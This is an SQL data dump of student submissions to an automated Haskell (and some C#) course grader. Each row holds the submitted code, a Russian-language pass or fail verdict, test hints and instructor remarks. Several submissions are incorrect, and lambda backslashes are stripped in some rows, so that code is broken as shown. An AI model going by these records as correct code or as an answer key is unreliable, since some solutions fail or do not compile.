(3079, 85, '2118411', '2012-11-02 12:05:34', 0, 'data Ration = Rat Integer Integer\r\ninstance Num Ration where\r\n        (Rat n1 d1) + (Rat n2 d2) = Rat (n1*d2+n2*d1) (d1*d2)\r\n        (Rat n1 d1) * (Rat n2 d2) = Rat (n1*n2) (d1*d2)\r\n\r\ninstance Show Ration where\r\n        show (Rat n d) = show n ++ "/" ++ show d\r\n\r\ninstance Eq Ration where\r\n        (Rat n1 d1) == (Rat n2 d2) = ((n1*d2-n2*d1) == 0)\r\n\r\ninstance Ord Ration where\r\n        (Rat n1 d1) < (Rat n2 d2) = ((n1*d2-n2*d1) < 0)\r\n        (Rat n1 d1) > (Rat n2 d2) = ((n1*d2-n2*d1) > 0)\r\n', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3080, 77, 'jogrms', '2012-11-02 12:16:38', 1, 'sqrt2 :: [Integer]\r\nsqrt2 = map ((x, _, _) -> x) calc where \r\n    calc = (1, 1, 1): map digit calc\r\n    \r\n    digit (_, root, rem) = let\r\n        hRem = 100 * rem\r\n        x = half root hRem 0 10\r\n        y = x * (20 * root + x)\r\n        in (x, 10 * root + x, hRem - y)\r\n\r\n    half p c l r\r\n        | r - l <= 1 = l\r\n        | l * (20 * p + l) == c = l\r\n        | r * (20 * p + r) == c = r\r\n        | otherwise = let m = l + div (r - l) 2 in\r\n            if m * (20 * p + m) <= c\r\n            then half p c m r\r\n            else half p c l m', '<br/>Тесты успешно пройдены!'),
(3081, 85, '2118411', '2012-11-02 12:17:07', 1, 'data Ration = Rat Integer Integer\r\n\r\ninstance Num Ration where\r\n\r\n        (Rat n1 d1) + (Rat n2 d2)\r\n\r\n                | d < 0 = Rat (-n) (-d)\r\n\r\n                | otherwise = Rat n d\r\n\r\n                where\r\n\r\n                        n = (n1*d2+n2*d1)\r\n\r\n                        d = (d1*d2)\r\n\r\n        (Rat n1 d1) * (Rat n2 d2)\r\n\r\n                | d < 0 = Rat (-n) (-d)\r\n\r\n                | otherwise = Rat n d\r\n\r\n                where\r\n\r\n                        n = (n1*n2)\r\n\r\n                        d = (d1*d2)\r\n\r\n\r\n\r\ninstance Show Ration where\r\n\r\n        show (Rat n d) = show n ++ "/" ++ show d\r\n\r\n\r\n\r\ninstance Eq Ration where\r\n\r\n        (Rat n1 d1) == (Rat n2 d2) = ((n1*d2-n2*d1) == 0)\r\n\r\n\r\n\r\ninstance Ord Ration where\r\n\r\n        (Rat n1 d1) < (Rat n2 d2)\r\n\r\n                | d < 0 = n > 0\r\n\r\n                | otherwise = n < 0\r\n\r\n                where\r\n\r\n                        n = (n1*d2-n2*d1)\r\n\r\n                        d = d1*d2\r\n\r\n        (Rat n1 d1) > (Rat n2 d2)\r\n\r\n                | d < 0 = n < 0\r\n\r\n                | otherwise = n > 0\r\n\r\n                where\r\n\r\n                        n = (n1*d2-n2*d1)\r\n\r\n                        d = d1*d2\r\n', '<br/>Тесты успешно пройдены!'),
(3082, 86, '2118411', '2012-11-02 12:17:35', 2, '  --- Нет, не совсем так. Вот так например у вас выдает True:\r\n  ---   allNondivisible [4,2]\r\n  --- (Я сейчас добавлю такой тест).\r\nallNondivisible xs = allNonDiv xs (const True)\r\nallNonDiv [] cond = True\r\nallNonDiv (x:xs) cond =\r\n        if not (cond x)\r\n        then False\r\n        else allNonDiv xs (	->cond t && mod t x /= 0)', '<br/>Тесты успешно пройдены!'),
(3083, 87, '2118411', '2012-11-02 12:17:52', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n        deriving Show\r\n\r\neval X val = val\r\neval (N num) val = num\r\neval (Add e1 e2) val = eval e1 val + eval e2 val\r\neval (Mult e1 e2) val = eval e1 val * eval e2 val\r\n', '<br/>Тесты успешно пройдены!'),
(3084, 88, '2118411', '2012-11-02 12:18:20', 0, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n        deriving Show\r\n\r\n\r\ndiff X = N 1\r\ndiff (N _) = N 0\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2)\r\ndiff (Mult e1 e2) = Add (Mult (diff e1) e2) (Mult (diff e2)  e1)\r\n', 'Выражение имеет неправильное значение: diff (Mult X X)'),
(3085, 88, '2118411', '2012-11-02 12:21:47', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n        deriving Show\r\n\r\ndiff X = N 1\r\ndiff (N _) = N 0\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2)\r\ndiff (Mult e1 e2) = Add (Mult(diff e1) e2)(Mult e1 (diff e2))\r\n', '<br/>Тесты успешно пройдены!'),
(3086, 89, '2118411', '2012-11-02 12:22:11', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nflatten Empty = []\r\nflatten (Node x l r) = (fl (Node x l r) id) []\r\nfl Empty f = f\r\nfl (Node x l r) f =  f.(x:).(fl l id).(fl r id)', '<br/>Тесты успешно пройдены!'),
(3087, 90, '2118411', '2012-11-02 12:22:29', 1, '   --- ОК, хасчитано, но это не очень удачный вариант, по-моему. По print вы можете глазами \r\n   --- посмотреть, что у вас получилось, но если вам надо будет что-то дальше сделать с этим результатом,\r\n   --- то это будет не просто..\r\nfindSame xs = fS xs []\r\nfS (x:xs) set =\r\n        if elem x set\r\n        then print ("Found: "++show x)\r\n        else fS xs (x:set)\r\nfS [] _ = print "Not found"\r\n', '<br/>Тесты успешно пройдены!'),
(3088, 91, '2118411', '2012-11-02 12:22:44', 1, 'merge [] ys = ys\r\nmerge xs [] = xs\r\nmerge (x:xs) (y:ys)\r\n        | x < y = x:(merge xs (y:ys))\r\n        | y < x = y:(merge (x:xs) ys)\r\n        | otherwise = x:(merge xs ys)\r\n', '<br/>Тесты успешно пройдены!'),
(3089, 78, 'jogrms', '2012-11-02 12:41:11', 1, 'pascal :: [[Integer]]\r\npascal = [1]:map (foldl ((a:as) x -> x:(x + a):as) [0]) pascal', '<br/>Тесты успешно пройдены!'),
(3090, 81, 'jogrms', '2012-11-02 13:03:12', 1, 'lst239 = 2:3:9: [x * 10 + y | x <- lst239, y <- [2,3,9]]', '<br/>Тесты успешно пройдены!'),
(3091, 87, '2562137', '2012-11-02 13:31:53', 1, 'data Expr = N Int | X | Add Expr Expr | Mult Expr Expr\r\n\r\neval X val = val\r\neval (N n) val = n\r\neval (Add e1 e2) val = (eval e1 val) + (eval e2 val)\r\neval (Mult e1 e2) val = (eval e1 val) * (eval e2 val)\r\n', '<br/>Тесты успешно пройдены!'),
(3092, 88, '2562137', '2012-11-02 13:32:11', 1, 'data Expr = N Int | X | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\ndiff X = N 1\r\ndiff (N n) = N 0\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2)\r\ndiff (Mult e1 e2) = Add (Mult (diff e1) e2) (Mult e1 (diff e2))\r\n', '<br/>Тесты успешно пройдены!'),
(3093, 86, '2118411', '2012-11-02 13:38:22', 1, 'allNondivisible xs = allNonDiv xs (const True)\r\nallNonDiv [] cond = True\r\nallNonDiv (x:xs) cond =\r\n        if not (cond x)\r\n        then False\r\n        else allNonDiv xs (	->cond t && mod t x /= 0 && mod x t /= 0)\r\n', '<br/>Тесты успешно пройдены!'),
(3094, 89, 'Deutsche', '2012-11-02 13:39:21', 1, '  --- ОК, очень хорошо, только название функции не очень соотвествующее, по-моему.\r\n  --- не find, наверное, а addToListMistRight или что-то в таком роде.\r\ndata Tree = Empty | Node Integer Tree Tree\r\nflatten Empty = []\r\nflatten (Node x l r) = findMostRight (Node x l r) []\r\nfindMostRight Empty s = s\r\nfindMostRight (Node x l r) s = let\r\n				s1 = findMostRight r s\r\n			       in x:findMostRight l s1', '<br/>Тесты успешно пройдены!'),
(3095, 90, 'Deutsche', '2012-11-02 14:03:07', 1, '  --- OK, засчитано, но не совсем по условию, мне кажется. Имелось в виду, что если ничего не нашли,\r\n  --- то пользователь должен увидеть это не глазами, а, я имел в виду, у него должна быть возможноть\r\n  --- узать это в программе. Но ОК, это мы обсудим.\r\nimport Data.List\r\nfindSame s = let\r\n		s1 = s  nub s\r\n	     in if (s1 == [])\r\n			then error "No dublicates"\r\n	        else s1 !! 0', '<br/>Тесты успешно пройдены!'),
(3096, 91, 'Deutsche', '2012-11-02 14:20:26', 1, 'merge s1 [] = s1\r\nmerge [] s2 = s2\r\nmerge (x1:s1) (x2:s2) = if (x1<x2)\r\n				then x1:merge s1 (x2:s2)\r\n			else\r\n			if (x1>x2)\r\n				then x2:merge (x1:s1) s2\r\n			else x1:merge s1 s2', '<br/>Тесты успешно пройдены!'),
(3097, 86, '2562137', '2012-11-02 15:37:04', 1, 'allNondivisible list = allNondivisible'' list (const True)\r\n\r\nallNondivisible'' [] cond = True\r\nallNondivisible'' (x:xs) cond = (cond x) && (allNondivisible'' xs (	 -> cond t && mod t x /= 0 && mod x t /= 0))', '<br/>Тесты успешно пройдены!'),
(3098, 85, '2562137', '2012-11-02 16:01:48', 0, 'data Ration = Rat Integer Integer\r\n\r\ninstance Eq Ration where\r\n	(Rat a b) == (Rat c d) = (a == c) && (b == d)\r\ninstance Num Ration where\r\n	(Rat a b) + (Rat c d) = Rat (a*d + b*c) (b*d)\r\ninstance Ord Ration where\r\n	(Rat a b) < (Rat c d) = (a * d) < (b * c)\r\ninstance Show Ration where\r\n	show (Rat a b) = (show a) ++ "/" ++ (show b)', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3099, 85, '2562137', '2012-11-02 16:08:28', 1, 'data Ration = Rat Integer Integer\r\n\r\ninstance Eq Ration where\r\n	(Rat a b) == (Rat c d) = (a == c) && (b == d)\r\n   --- Это кстати по сути неправильно - ведь например 1 / 3 == 2 /6 по смыслу. Но ОК, в данном случае неважно..\r\ninstance Num Ration where\r\n	(Rat a b) + (Rat c d) = Rat (a*d + b*c) (b*d)\r\ninstance Ord Ration where\r\n	(Rat a b) < (Rat c d) = (b*c - a*d) * b*d > 0\r\ninstance Show Ration where\r\n	show (Rat a b) = (show a) ++ "/" ++ (show b)', '<br/>Тесты успешно пройдены!'),
(3100, 91, 'tonyo', '2012-11-02 17:55:51', 0, 'merge lx ly = merge1 lx ly []\r\n\r\nmerge1 [] [] res = reverse res\r\nmerge1 (x:xs) [] res = merge1 xs [] (x:res)\r\nmerge1 [] (y:ys) res = merge1 [] ys (y:res)\r\nmerge1 (x:xs) (y:ys) res =  if x < y \r\n                            then merge1 xs (y:ys) (x:res)\r\n                            else merge1 (x:xs) ys (y:res) ', 'Выражение имеет неправильное значение: merge [1,4,8] [2,4,5,10,20]'),
(3101, 91, 'tonyo', '2012-11-02 17:56:57', 0, 'merge lx ly = merge1 lx ly []\r\n\r\nmerge1 [] [] res = reverse res\r\nmerge1 (x:xs) [] res = merge1 xs [] (x:res)\r\nmerge1 [] (y:ys) res = merge1 [] ys (y:res)\r\nmerge1 (x:xs) (y:ys) res =  if x < y                                                                                                                                                            \r\n                            then merge1 xs (y:ys) (x:res) \r\n                            else merge1 (x:xs) ys (y:res) ', 'Выражение имеет неправильное значение: merge [1,4,8] [2,4,5,10,20]'),
(3102, 91, 'tonyo', '2012-11-02 18:52:31', 1, 'merge xs ys \r\n  | xs == [] && ys == []  = []\r\n  | xs == []              = ys\r\n  | ys == []              = xs\r\n  | hxs < hys             = let mtx = merge txs ys\r\n                            in if head mtx /= hxs \r\n                               then hxs : mtx\r\n                               else mtx\r\n  | otherwise             = let mty = merge xs tys\r\n                            in if head mty /= hys \r\n                               then hys : mty\r\n                               else mty\r\n  where txs = tail xs; tys = tail ys; hxs = head xs; hys = head ys\r\n', '<br/>Тесты успешно пройдены!'),
(3103, 91, '533223', '2012-11-02 21:13:46', 1, 'merge (x:xs) (y:ys) = if (x<y) then x:(merge xs (y:ys))\r\n			else if (x>y) then y:(merge (x:xs) ys)\r\n				else x:(merge xs ys)\r\nmerge (x:xs) _ = x:xs\r\nmerge _ y = y', '<br/>Тесты успешно пройдены!'),
(3104, 89, '550896', '2012-11-03 12:39:20', 1, 'data Tree a = Empty | Node a (Tree a) (Tree a)\r\n\r\nflatten :: Tree a -> [a]\r\nflatten Empty = []\r\nflatten (Node e left right) = [e] ++ flatten left ++ flatten right', '<br/>Тесты успешно пройдены!'),
(3105, 85, '550896', '2012-11-03 13:46:54', 0, 'data Rat = Rat Int Int\r\n\r\nclass Ration a where\r\n    show :: a -> String\r\n    (==) :: a -> a -> Bool\r\n    (+) :: a -> a -> a\r\n    (<) :: a -> a -> Bool\r\n\r\ninstance Ration Rat where \r\n    show (Rat n d) =  (show n) ++ "/" ++ (show d)\r\n    (Rat n0 d0) == (Rat n1 d1) = (n0 * d1 == n1 * d0)\r\n    (Rat n0 d0) + (Rat n1 d1) = Rat (n0 * d1 + n1 * d0) (d0 * d1)\r\n    (Rat n0 d0) < (Rat n1 d1) = n0 * d1 < n1 * d0', 'Не удалось вычислить выражение "Rat 1 2 + Rat 1 7", проверьте правильность синтаксиса'),
(3106, 85, '550896', '2012-11-03 13:47:08', 2, '   --- Не совсем так. На самом деле функции show == + и < уже описаны\r\n   --- в стандартный=х классах Haskell. Например, + описан в классе Num,\r\n   --- а где описаны остальные - мы говорили на занятиях.\r\n   --- Не вам никаких новых класслв описывать не надо, а надо описать\r\n   --- Rat, как instance нескольких существующих классов.\r\n   --- Попробуйте, пожалуйста. Но, если до 15.11 не получится, пришлите снова\r\n   --- это решение, я его тоже засчитаю.\r\ndata Rat = Rat Int Int\r\n\r\nclass Ration a where\r\n    show :: a -> String\r\n    (==) :: a -> a -> Bool\r\n    (+) :: a -> a -> a\r\n    (<) :: a -> a -> Bool\r\n\r\ninstance Ration Rat where \r\n    show (Rat n d) =  (Prelude.show n) ++ "/" ++ (Prelude.show d)\r\n    (Rat n0 d0) == (Rat n1 d1) = (n0 * d1 Prelude.== n1 * d0)\r\n    (Rat n0 d0) + (Rat n1 d1) = Rat (n0 * d1 Prelude.+ n1 * d0) (d0 * d1)\r\n    (Rat n0 d0) < (Rat n1 d1) = n0 * d1 Prelude.< n1 * d0', 'Не удалось вычислить выражение "Rat 1 2 + Rat 1 7", проверьте правильность синтаксиса'),
(3107, 77, '9539826', '2012-11-03 14:48:35', 2, 'sqrt2 = [rem (truncate(sqrt(2)*(10^x))) 10| x<-[0..]]\r\n   --- Нет, если использовать плавающую точку, то никак, никак не получить больше 15 правильных знаков\r\n   --- Я на эту тему написал на стене в группе, можете посмотреть:\r\n   --- http://vk.com/wall-41863301_99 ', 'Выражение имеет неправильное значение: take 20 sqrt2'),
(3108, 85, '550896', '2012-11-03 15:13:38', 0, 'data Rat = Rat Int Int\r\n\r\ninstance Show Rat where\r\n    show (Rat n d) =  (Prelude.show n) ++ "/" ++ (show d)\r\n    \r\ninstance Eq Rat where \r\n    (Rat n0 d0) == (Rat n1 d1) = (n0 * d1 Prelude.== n1 * d0)\r\n    \r\ninstance Ord Rat where \r\n    (Rat n0 d0) < (Rat n1 d1) = n0 * d1 Prelude.< n1 * d0   \r\n\r\ninstance Num Rat where  \r\n    (Rat n0 d0) + (Rat n1 d1) = Rat (n0 * d1 Prelude.+ n1 * d0) (d0 * d1)', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3109, 85, '550896', '2012-11-03 15:18:29', 0, 'data Rat = Rat Int Int\r\n\r\ninstance Show Rat where\r\n    show (Rat n d) =  (show n) ++ "/" ++ (show d)\r\n    \r\ninstance Eq Rat where \r\n    (Rat n0 d0) == (Rat n1 d1) = (n0 * d1 == n1 * d0)\r\n    \r\ninstance Ord Rat where \r\n    (Rat n0 d0) < (Rat n1 d1) = (n0 * d1 < n1 * d0) && (d0 * d1 > 0)   \r\n\r\ninstance Num Rat where  \r\n    (Rat n0 d0) + (Rat n1 d1) = Rat (n0 * d1 + n1 * d0) (d0 * d1)', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3110, 85, '550896', '2012-11-03 15:27:25', 1, 'data Rat = Rat Int Int\r\n\r\ninstance Show Rat where\r\n    show (Rat n d) = (show n) ++ "/" ++ (show d)\r\n    \r\ninstance Eq Rat where \r\n    (Rat n0 d0) == (Rat n1 d1) = (n0 * d1 == n1 * d0)\r\n    \r\ninstance Ord Rat where \r\n    (Rat n0 d0) < (Rat n1 d1) = (n0 * d1 - n1 * d0) * (d0 * d1) < 0\r\n\r\ninstance Num Rat where  \r\n    (Rat n0 d0) + (Rat n1 d1) = Rat (n0 * d1 + n1 * d0) (d0 * d1)', '<br/>Тесты успешно пройдены!'),
(3111, 87, '550896', '2012-11-03 16:04:02', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\neval :: Expr -> Integer -> Integer\r\neval (Mult e0 e1) n = (eval e0 n) * (eval e1 n)      \r\neval (Add e0 e1) n = (eval e0 n) + (eval e1 n)\r\neval (N n0) n = n0  \r\neval x n = n    ', '<br/>Тесты успешно пройдены!'),
(3112, 88, '550896', '2012-11-03 16:10:33', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\ndiff :: Expr -> Expr\r\ndiff (Mult e0 e1) = Add (Mult (diff e0) e1) (Mult e0 (diff e1))    \r\ndiff (Add e0 e1) = Add (diff e0) (diff e1)\r\ndiff (N n) = N 0\r\ndiff x = N 1    ', '<br/>Тесты успешно пройдены!'),
(3113, 80, '3742311', '2012-11-03 18:11:33', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace Task192\r\n\r\n{\r\n\r\n    public static class Program\r\n\r\n    {\r\n\r\n        private class Pair\r\n\r\n        {\r\n\r\n            public int First { get; private set; }\r\n\r\n            public int Second { get; private set; }\r\n\r\n\r\n\r\n            public Pair(int first, int second)\r\n\r\n            {\r\n\r\n                First = first;\r\n\r\n                Second = second;\r\n\r\n            }\r\n\r\n\r\n\r\n            public override string ToString()\r\n\r\n            {\r\n\r\n                return First + " " + Second;\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        private static IEnumerable<Pair> Cantor()\r\n\r\n        {\r\n\r\n            for (int i = 1; ; ++i)\r\n\r\n            {\r\n\r\n                for (int j = 1, k = i; k > 0; ++j, --k)\r\n\r\n                {\r\n\r\n                    yield return new Pair(j, k);\r\n\r\n                } \r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        public static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int i = 0;\r\n\r\n            foreach (Pair p in Cantor())\r\n\r\n            {\r\n\r\n                Console.WriteLine(p);\r\n\r\n\r\n\r\n                if (++i > 20)\r\n\r\n                {\r\n\r\n                    break;\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3114, 85, '355679', '2012-11-03 18:16:42', 0, 'data Ration = Rat Integer Integer\n\n\n\ninstance Show Ration where\n\n	show (Rat a b) = "" ++ show a ++ "/" ++ show b \n\n\n\ninstance Eq (Ration) where\n\n	(Rat a1 b1) == (Rat a2 b2) = a1 == a2 && b1 == b2\n\n\n\ninstance Num (Ration) where\n\n	(Rat a1 b1) + (Rat a2 b2) = Rat (a1 * b2 + a2 * b1) (b1 * b2)\n\n	(Rat a1 b1) - (Rat a2 b2) = Rat (a1 * b2 - a2 * b1) (b1 * b2)\n\n\n\ninstance Ord (Ration) where\n\n	(Rat a1 b1) `compare` (Rat a2 b2) = compare (a1*b2) (a2*b1)\n\n\n', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3115, 79, '3742311', '2012-11-03 18:25:11', 1, 'using System;\r\nusing System.Collections.Generic;\r\n\r\nnamespace Task191\r\n{\r\n    public static class Program\r\n    {\r\n        public static IEnumerable<int> Digits(int z)\r\n        {\r\n            int t = 10;\r\n\r\n            for (int i = 0; ; ++i)\r\n            {\r\n                yield return t / z;\r\n\r\n                t = (t % z) * 10;\r\n            }\r\n        }\r\n\r\n        public static void Main(string[] args)\r\n        {\r\n            int i = 0;\r\n\r\n            foreach (int x in Digits(7))\r\n            {\r\n                Console.Write(x);\r\n\r\n                if (++i > 99)\r\n                {\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3116, 82, '3742311', '2012-11-03 18:50:58', 2, '  --- Алгоритм, вроде бы, правильный, у меня это даже не компилируется, очевидная синтаксическая ошибка\r\n  --- Вы сделайте, чтобы компилировалось, пожалуйста.\r\ncountDifferentVarsInList l = length (foldl (s x -> if (any (p -> p == x) s) then s else x:s) [] l)\r\n\r\ncountDifferentVars [] v = countDifferentVarsInList v\r\ncountDifferentVars (a, b):t v = countDifferentVars (map ((m, n) -> if m == a then (b, n) else if n == a then (m, b) else (m, n)) t) (map (x -> if x == a then b else x) v)', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
(3117, 91, '550896', '2012-11-03 18:59:50', 1, 'merge :: [Int] -> [Int] -> [Int]\r\nmerge [] a = a\r\nmerge a [] = a\r\nmerge a0 a1 | (head a0) == (head a1) = [head a0] ++ (merge (tail a0) (tail a1))\r\nmerge a0 a1 | (head a0) < (head a1) = [head a0] ++ (merge (tail a0) a1)\r\nmerge a0 a1 = [head a1] ++ (merge a0 (tail a1))', '<br/>Тесты успешно пройдены!'),
(3118, 90, '355679', '2012-11-03 19:52:10', 2, 'data Result = Result Int\r\n\r\n\r\n\r\ninstance Show Result where\r\n\r\n	show (Result 0) = "Все элементы представлены в списке одинаковое количество раз!"\r\n\r\n	show (Result i) = show i\r\n   --- А что делать, если у нас число 0 встретилось много раз? Мы вернем 0, а выглядеть\r\n   --- это будет, как будто мы ничего не нашли. Придумайте, может что-нибудь на этот случай?\r\n   --- Если не хотите особо думать, просто пришлите это решение еще раз, и я его засчитаю.\r\n   --- (Еще, на самом деле, вы решаете не совсем ту задачу, которая была в условии - более сложую,\r\n   --- видимо. Но ОК, это в данном случае не важно.)\r\n\r\n-- считает количество вхождений элемента в список\r\n\r\ncountEntries x = length . (filter (==x))\r\n\r\n\r\n\r\nmostCommonElem xs = (foldr\r\n\r\n		(curElem (prevElem, prevCount) -> let {\r\n\r\n				curCount = countEntries curElem xs\r\n\r\n			} in (\r\n\r\n				if (curCount > prevCount) then\r\n\r\n					(curElem, curCount)\r\n\r\n				else\r\n\r\n					(prevElem, prevCount)\r\n\r\n			)\r\n\r\n		)\r\n\r\n		(0,0)\r\n\r\n		xs\r\n\r\n	)\r\n\r\n\r\n\r\nfindSame xs = let {\r\n\r\n		(elem, count) = mostCommonElem xs\r\n\r\n	} in (\r\n\r\n		if (count == 0 || (count == 1 && length xs > 1)) then\r\n\r\n			Result 0\r\n\r\n		else\r\n\r\n			Result elem\r\n\r\n	)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3119, 85, '355679', '2012-11-03 19:58:45', 0, 'data Ration = Rat Int Int\n\n\n\ninstance Show Ration where\n\n	show (Rat a b) = (if a * b < 0 then "-" else "") ++ show (abs a) ++ "/" ++ show (abs b) \n\n\n\ninstance Eq (Ration) where\n\n	(Rat a1 b1) == (Rat a2 b2) = a1 == a2 && b1 == b2\n\n\n\ninstance Num (Ration) where\n\n	(Rat a1 b1) + (Rat a2 b2) = Rat (a1 * b2 + a2 * b1) (b1 * b2)\n\n	(Rat a1 b1) - (Rat a2 b2) = Rat (a1 * b2 - a2 * b1) (b1 * b2)\n\n\n\ninstance Ord (Ration) where\n\n	(Rat a1 b1) `compare` (Rat a2 b2) = compare (a1*b2) (a2*b1)\n\n\n', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3120, 85, '355679', '2012-11-03 20:08:59', 0, 'data Ration = Rat Integer Integer\n\n\n\ninstance Show Ration where\n\n	show (Rat a b) = (if a * b < 0 then "-" else "") ++ show (abs a) ++ "/" ++ show (abs b) \n\n\n\ninstance Eq (Ration) where\n\n	(Rat a1 b1) == (Rat a2 b2) = a1 * b2 == a2 * b1\n\n\n\ninstance Num (Ration) where\n\n	(Rat a1 b1) + (Rat a2 b2) = Rat (a1 * b2 + a2 * b1) (b1 * b2)\n\n	(Rat a1 b1) - (Rat a2 b2) = Rat (a1 * b2 - a2 * b1) (b1 * b2)\n\n\n\ninstance Ord (Ration) where\n\n	(Rat a1 b1) `compare` (Rat a2 b2) = compare (a1*b2) (a2*b1)\n\n\n\ntestEq = (Rat 3 (-7)) == (Rat (-3) 7)\n\ntestShow = show (Rat 3 (-2)) == "-3/2"\n\ntestPlus = ((Rat 1 2) + (Rat (-6) 7)) == (Rat (-5) 14)\n\ntestOrd = (Rat (-2) (-7)) > (Rat 1 (-10000))\n\ntest = testEq && testShow && testPlus && testOrd\n\n\n', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3121, 85, '355679', '2012-11-03 20:36:05', 2, 'data Ration = Rat Integer Integer\r\n\r\n\r\n\r\ninstance Show Ration where\r\n\r\n	show (Rat a b) = (if a * b < 0 then "-" else "") ++ show (abs a) ++ "/" ++ show (abs b) \r\n\r\n\r\n\r\ninstance Eq (Ration) where\r\n\r\n	(Rat a1 b1) == (Rat a2 b2) = a1 * b2 == a2 * b1\r\n\r\n\r\n\r\ninstance Num (Ration) where\r\n\r\n	(Rat a1 b1) + (Rat a2 b2) = Rat (a1 * abs b2 + a2 * abs b1) (b1 * b2)\r\n\r\n	(Rat a1 b1) - (Rat a2 b2) = (Rat a1 b1) + (Rat (-a2) b2)\r\n\r\n\r\n\r\ninstance Ord (Ration) where\r\n\r\n	(Rat a1 b1) `compare` (Rat a2 b2) = compare (a1 * b2) (a2 * b1)\r\n   --- Так а если один знаменатель отрицательный, а другой - нет?\r\n   --- Исправьте, пожалуйста.\r\n\r\n\r\ntestEq = (Rat 3 (-7)) == (Rat (-3) 7)\r\n\r\ntestShow = show (Rat 3 (-2)) == "-3/2"\r\n\r\ntestPlus1 = ((Rat 1 2) + (Rat (-6) 7)) == (Rat (-5) 14)\r\n\r\ntestPlus2 = ((Rat 1 3) - (Rat (-1) 2)) == (Rat 5 6)\r\n\r\ntestOrd = (Rat (-2) (-7)) > (Rat 1 (-10000))\r\n\r\ntest = testEq && testShow && testPlus2 && testPlus1 && testOrd\r\n\r\n\r\n', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3122, 86, '355679', '2012-11-03 20:37:00', 1, 'allNondivisible xs = allNondivisible'' xs (const True)\r\n\r\n\r\n\r\nallNondivisible'' [] _ = True\r\n\r\nallNondivisible'' (x:xs) f = \r\n\r\n	f x && \r\n\r\n	allNondivisible'' xs ( y -> (f y) && (y `mod` x /= 0) && (x `mod` y /= 0) )\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3123, 87, '355679', '2012-11-03 20:37:21', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\n\r\n\r\ninstance Show Expr where\r\n\r\n	show X = "X"\r\n\r\n	show (N n) = "N " ++ show n\r\n\r\n	show (Add e1 e2) = "Add (" ++ show e1 ++ ") (" ++ show e2 ++ ")"\r\n\r\n	show (Mult e1 e2) = "Mult (" ++ show e1 ++ ") (" ++ show e2 ++ ")"\r\n\r\n\r\n\r\neval X x = x\r\n\r\neval (N n) x = n\r\n\r\neval (Add e1 e2) x = eval e1 x + eval e2 x\r\n\r\neval (Mult e1 e2) x = eval e1 x * eval e2 x\r\n\r\n\r\n\r\ndiff X = N 1\r\n\r\ndiff (N _) = N 0\r\n\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2)\r\n\r\ndiff (Mult e1 e2) = Add (Mult (diff e1) e2) (Mult e1 (diff e2))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3124, 88, '355679', '2012-11-03 20:37:37', 0, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\n\n\n\ninstance Show Expr where\n\n	show X = "X"\n\n	show (N n) = "N " ++ show n\n\n	show (Add e1 e2) = "Add (" ++ show e1 ++ ") (" ++ show e2 ++ ")"\n\n	show (Mult e1 e2) = "Mult (" ++ show e1 ++ ") (" ++ show e2 ++ ")"\n\n\n\neval X x = x\n\neval (N n) x = n\n\neval (Add e1 e2) x = eval e1 x + eval e2 x\n\neval (Mult e1 e2) x = eval e1 x * eval e2 x\n\n\n\ndiff X = N 1\n\ndiff (N _) = N 0\n\ndiff (Add e1 e2) = Add (diff e1) (diff e2)\n\ndiff (Mult e1 e2) = Add (Mult (diff e1) e2) (Mult e1 (diff e2))\n\n\n', 'Выражение имеет неправильное значение: diff (Mult X X)'),
(3125, 88, '355679', '2012-11-03 20:42:13', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\n\r\n\r\neval X x = x\r\n\r\neval (N n) x = n\r\n\r\neval (Add e1 e2) x = eval e1 x + eval e2 x\r\n\r\neval (Mult e1 e2) x = eval e1 x * eval e2 x\r\n\r\n\r\n\r\ndiff X = N 1\r\n\r\ndiff (N _) = N 0\r\n\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2)\r\n\r\ndiff (Mult e1 e2) = Add (Mult (diff e1) e2) (Mult e1 (diff e2))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
